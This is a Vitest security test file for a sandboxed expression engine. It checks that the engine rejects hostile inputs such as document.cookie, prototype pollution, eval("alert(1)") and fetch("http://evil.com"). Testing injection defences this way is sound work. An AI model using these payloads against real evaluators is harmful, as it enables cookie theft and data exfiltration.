import { describe, it, expect } from 'vitest';
import { ExpressionEngine } from '../engine';

const engine = new ExpressionEngine();
const ctx = { formData: { name: 'test' } };

describe('Security', () => {
  it('rejects window access', () => {
    expect(engine.evaluate('window.location', ctx)).toBeUndefined();
  });
  it('rejects document access', () => {
    expect(engine.evaluate('document.cookie', ctx)).toBeUndefined();
  });
  it('rejects __proto__ pollution', () => {
    expect(engine.evaluate('__proto__.polluted', ctx)).toBeUndefined();
  });
  it('rejects constructor', () => {
    expect(engine.evaluate('constructor', ctx)).toBeUndefined();
  });
  it('rejects eval call', () => {
    expect(engine.evaluate('eval("alert(1)")', ctx)).toBeUndefined();
  });
  it('rejects fetch', () => {
    expect(engine.evaluate('fetch("http://evil.com")', ctx)).toBeUndefined();
  });
  it('rejects this', () => {
    expect(engine.evaluate('this', ctx)).toBeUndefined();
  });
  it('rejects assignment', () => {
    const result = engine.validate('a = 1');
    expect(result.valid).toBe(false);
  });
  it('context is frozen - original data not mutated', () => {
    engine.evaluate('formData.name', ctx);
    expect(ctx.formData.name).toBe('test');
  });
});
